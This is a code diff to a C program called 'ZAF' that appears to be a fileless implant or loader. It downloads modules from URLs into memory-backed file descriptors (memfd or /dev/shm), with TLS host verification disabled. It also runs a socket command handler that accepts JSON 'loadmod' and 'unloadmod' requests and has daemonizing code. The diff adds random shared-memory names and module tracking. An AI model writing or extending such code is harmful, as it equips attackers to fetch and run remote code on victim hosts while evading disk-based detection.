@@ -104,15 +104,31 @@ int checKernel() {
 	}
 }
 
+void gen_random(char *s, const int len) {
+    static const char alphanum[] =
+        "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz";
+
+    for (int i = 0; i < len; ++i) {
+        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+    }
+
+    s[len] = 0;
+}
+
 
 // Returns a file descriptor where we can write our shared object
 int open_ramfs(void) {
-	int shm_fd;
+
+    int shm_fd;
+    char s[6] = {};
 
 	//If we have a kernel < 3.17
 	// We need to use the less fancy way
 	if (memfd_kv_s.memfd_supp == 0) {
-		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
+        gen_random(s, 6);
+		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRWXU);
 		if (shm_fd < 0) { //Something went wrong :(
 			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
 			return 1;
@@ -169,6 +185,7 @@ int download_to_RAM(char *download) {
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
+        
         // Op_Nomad: Modded to avoid gcc warning 
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*) &shm_fd_s); //Args for our callback
 		
@@ -185,28 +202,7 @@ int download_to_RAM(char *download) {
     return 0;
 }
 
-// Load the shared object from within
-void load_so(int shm_fd) {
-	char path[1024];
-	void *handle;
 
-	log_debug("LoadSo: Trying to load Shared Object");
-	if (memfd_kv_s.memfd_supp == 1) { //Funky way
-	    log_debug("LoadSo: memfd_create() is supported.");
-		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
-	} else { // Not funky way :(
-		close(shm_fd);
-		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
-	    log_debug("LoadSo: only /dev/shm supported.");
-	}
-    log_debug("LoadSo: Path to fd: %s", path);
-	handle = dlopen(path, RTLD_LAZY);
-	if (!handle) {
-		log_error("LoadSo: Dlopen failed with error: %s", dlerror());
-	}
-}
-
-// Get memfd location 
 int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
     
@@ -216,10 +212,11 @@ int setMemfdTbl(int shm_fd, char* mname) {
 	    log_debug("MemTbl: memfd_create() is supported.");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
     } else { // Not funky way :(
-        close(shm_fd);
-        snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
+        close(shm_fd); // TODO: test this whole thing. still drive via proc?
+        snprintf(path, 1024, "/dev/shm/%s", mname);
 	    log_debug("MemTbl: only /dev/shm supported.");
     }
+
     if (check_empty(head) == 0) {
         log_debug("Memtbl: Head of list empty");
         head = calloc(1,sizeof(node_t));
@@ -227,9 +224,9 @@ int setMemfdTbl(int shm_fd, char* mname) {
 		    log_fatal("MemTble: calloc() failed");
             return 1;
         }
-        push_first(head, path, mname);
+        push_first(head, shm_fd, path, mname);
     }else{
-        push(head, path, mname);
+        push(head, shm_fd, path, mname);
     }
     return 0;
 }
@@ -252,9 +249,9 @@ int main (int argc, char **argv) {
     }
 
 	log_info("=== ZAF ===\n");
-    backgroundDaemonLeader();
+    //backgroundDaemonLeader();
+    doWork();
 
-    //load_so(fd, fd_s);
     fclose (fp);
 	return 0;
 }
@@ -263,7 +260,6 @@ void doWork(){
 
     char urlbuf[255] = {'\0'};
 	int fd, i;
-
 
     if (checKernel() == 1){
 	    log_info("Worker: memfd_create() support seems to be available.");
@@ -281,8 +277,8 @@ void doWork(){
         if (fd != 0){
             setMemfdTbl(fd, modules[i]);
         }
-
     }
+    
     setupCmdP();
 
 }
@@ -352,7 +348,6 @@ int backgroundDaemonLeader(){
     log_debug("Daemon: after signal handlers");
 
     log_debug("Daemon: before doWork()");
-    doWork();
 
     return 0;
 }
@@ -427,6 +422,7 @@ int processCommandReq (int sock, node_t * head) {
    cJSON * loadmod_arg = NULL;
    cJSON * loadmod_args = NULL;
    cJSON * modUrl = NULL;
+   cJSON * modName = NULL;
 
 
    bzero(buffer,MAX_BUF);
@@ -467,6 +463,7 @@ int processCommandReq (int sock, node_t * head) {
        write_modlist(head, sock);
        status=1;
        goto end;
+
      }
      else if (strcmp(cmdName->valuestring, "loadmod") == 0)
      {
@@ -483,11 +480,31 @@ int processCommandReq (int sock, node_t * head) {
        loadmod_args = cJSON_GetObjectItemCaseSensitive(root, "args");
        cJSON_ArrayForEach(loadmod_arg, loadmod_args)
        {
-            modUrl = cJSON_GetObjectItemCaseSensitive(loadmod_arg, "modurl");
-            log_debug("[Command] : modurl (%s)", modUrl->valuestring);
-            load_mod(head, modUrl->valuestring);
+           modUrl = cJSON_GetObjectItemCaseSensitive(loadmod_arg, "modurl");
+           log_debug("[Command] : modurl (%s)", modUrl->valuestring);
+           load_mod(head, modUrl->valuestring);
+           goto end;
+       }
+     }
+     else if (strcmp(cmdName->valuestring, "unloadmod") == 0)
+     {
+       loadmod_args = cJSON_CreateArray();
+       if (loadmod_args == NULL)
+       {
+           log_debug("[Command] loadmod : cJSON_CreateArray()");
+           status=1;
+           goto end;
        }
 
+       log_debug("[Command] : %s", cmdName->valuestring);
+       loadmod_args = cJSON_GetObjectItemCaseSensitive(root, "args");
+       cJSON_ArrayForEach(loadmod_arg, loadmod_args)
+       {
+           modName = cJSON_GetObjectItemCaseSensitive(loadmod_arg, "modname");
+           log_debug("[Command] : modname (%s)", modName->valuestring);
+           unload_mod(head, modName->valuestring);
+           goto end;
+       }
      }
      else {
        log_debug("Command request (%s)", cmdName->valuestring);
@@ -515,6 +532,45 @@ int list_sz(node_t * head) {
     }
     return c;
 }
+
+int mod_name2fd(node_t * head, char * name) {
+    node_t * current = head;
+    int found=0;
+    while (current != NULL) {
+        if ( strncmp(current->mname, name, sizeof(current->mname)) == 0){
+          log_debug("FindMod: found entry %s", current->mname);
+          found=1;
+          break;
+        }
+        current = current->next;
+    }
+
+    if (found){
+        return current->fd; 
+    }
+    return 0;
+}
+
+char * mod_name2path(node_t * head, char * name) {
+    node_t * current = head;
+    char * empty = "";
+    int found=0;
+
+    while (current != NULL) {
+        if ( strncmp(current->mname, name, sizeof(current->mname)) == 0){
+          log_debug("FindMod: found entry %s", current->mname);
+          found=1;
+          break;
+        }
+        current = current->next;
+    }
+
+    if (found){
+        return strdup(current->mpath); 
+    }
+    return empty;
+}
+
 void write_modlist(node_t * head, int sock) {
     node_t * current = head;
     int n, ret;
@@ -524,7 +580,7 @@ void write_modlist(node_t * head, int sock) {
     while (current != NULL) {
         entry = calloc(1, MAX_BUF);
 
-		ret = snprintf(entry, MAX_BUF-1, "%s : %s\n", current->mpath, current->mname);
+		ret = snprintf(entry, MAX_BUF-1, "%d : %s : %s\n", current->fd, current->mpath, current->mname);
         if (ret < 0) {
          free(entry);
          continue;
@@ -538,6 +594,41 @@ void write_modlist(node_t * head, int sock) {
         free(entry);
         current = current->next;
     }
+}
+
+int unload_mod(node_t * head, char * name) {
+    int modfd = 0;
+    int status = 0;
+
+    modfd = mod_name2fd(head, name);
+    if ( modfd != 0 ){
+       log_debug("Worker: Module fd found %d", modfd);
+       status = 1;
+       log_debug("Worker: Closing OS process fd %d", modfd);
+       close(modfd);      // close from OS
+       log_debug("Worker: Removing data from memory for fd %d", modfd);
+       delete_mod(head, modfd); // from ShmMemTbl
+    }else{
+        log_debug("Worker: Module fd not found");
+    }
+
+    return status;
+}
+
+int find_mod(node_t * head, char * name) {
+    
+    char* modname = NULL;
+    int status = 0;
+
+    modname = mod_name2path(head, name);
+    if ((modname != NULL) && (modname[0] != '\0')) {
+        log_debug("Worker: Module found %s", modname);
+        status = 1;
+    }else{
+        log_debug("Worker: Module not found %s", modname);
+    }
+
+    return status;
 }
 
 int load_mod(node_t * head, char * url) {
@@ -579,10 +670,53 @@ clean:
 
 }
 
+//delete a link with given key
+int delete_mod(node_t * head, int fd) {
 
-int push_first(node_t * head, char* path, char* mname) {
+   node_t * current = head;
+   node_t * previous = NULL;
+   int status = 0;
+
+   if(head == NULL) {
+      return status;
+   }
+
+
+   while(current->fd != fd) {
+
+      log_debug("DeleteMod: current->fd: %d", current->fd);
+      
+      //if it is last node
+      if(current->next == NULL) {
+         return status;
+      } else {
+        //store reference to current link
+        previous = current;
+        //move to next link
+        current = current->next;
+      }
+   }
+
+
+   //found a match, update the link
+   if(current == head) {
+       
+     //change first to point to next link
+     head = head->next;
+     status = 1;
+   } else {
+      //bypass the current link
+      previous->next = current->next;
+      status = 1;
+   }
+
+   return status;
+}
+
+int push_first(node_t * head, int shm_fd, char* path, char* mname) {
 
     log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
+    head->fd = shm_fd;
     strncpy(head->mpath, path, strlen(path));
     strncpy(head->mname, mname, strlen(mname));
     head->next = NULL;
@@ -591,7 +725,7 @@ int push_first(node_t * head, char* path, char* mname) {
     return 0;
 }
 
-int push(node_t * head, char* path, char* mname) {
+int push(node_t * head, int shm_fd, char* path, char* mname) {
     node_t * current = head;
 
     log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
@@ -606,6 +740,7 @@ int push(node_t * head, char* path, char* mname) {
         return 1;
     }
 
+    current->next->fd = shm_fd;
     strncpy(current->next->mpath, path, strlen(path));
     strncpy(current->next->mname, mname, strlen(mname));
     current->next->next = NULL;
